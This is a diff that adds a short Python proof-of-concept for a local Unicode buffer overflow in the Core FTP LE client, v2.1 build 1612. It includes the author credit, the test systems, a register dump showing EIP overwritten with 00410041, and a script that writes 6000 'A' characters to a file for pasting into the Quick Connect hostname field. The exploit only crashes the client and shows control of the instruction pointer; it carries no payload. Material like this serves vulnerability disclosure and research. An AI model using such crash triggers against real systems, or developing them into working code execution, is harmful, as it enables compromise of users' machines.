@@ -1,0 +1,53 @@
+#!/usr/bin/env python
+
+####################################################################################
+#
+# Core FTP LE v2.1 build 1612 Local Buffer Overflow PoC (Unicode)
+# Found By:	Dr_IDE
+# Tested On:	XPSP3, 7RC
+# Notes:	Most likely other versions are vulnerable too.
+# Usage:	File, Quick Connect, Paste into Hostname, Connect
+#
+####################################################################################
+
+# Register Dump on XPSP3
+"""
+EAX 00000064
+ECX 00410041 coreftp.00410041
+EDX 0054F840 coreftp.0054F840
+EBX 026E2FFC
+ESP 0321E958 UNICODE "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+EBP 00410041 coreftp.00410041
+ESI 0269CC30
+EDI 04BB6A58 UNICODE "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+EIP 00410041 coreftp.00410041
+C 0  ES 002B 32bit 0(FFFFFFFF)
+P 0  CS 0023 32bit 0(FFFFFFFF)
+A 0  SS 002B 32bit 0(FFFFFFFF)
+Z 0  DS 002B 32bit 0(FFFFFFFF)
+S 0  FS 0053 32bit 7EFD7000(FFF)
+T 0  GS 002B 32bit 0(FFFFFFFF)
+D 0
+O 0  LastErr WSAHOST_NOT_FOUND (00002AF9)
+EFL 00010202 (NO,NB,NE,A,NS,PO,GE,G)
+ST0 empty 0.0
+ST1 empty 0.0
+ST2 empty 0.0
+ST3 empty 0.0
+ST4 empty 0.0
+ST5 empty 0.0
+ST6 empty 0.0
+ST7 empty 0.0
+               3 2 1 0      E S P U O Z D I
+FST 0000  Cond 0 0 0 0  Err 0 0 0 0 0 0 0 0  (GT)
+FCW 027F  Prec NEAR,53  Mask    1 1 1 1 1 1
+"""
+
+# After Passing Exception on XPSP3
+# EIP 00410041 coreftp.00410041
+
+buff = ("\x41" * 6000)
+
+f1 = open("coreftple.txt","w")
+f1.write(buff)
+f1.close()
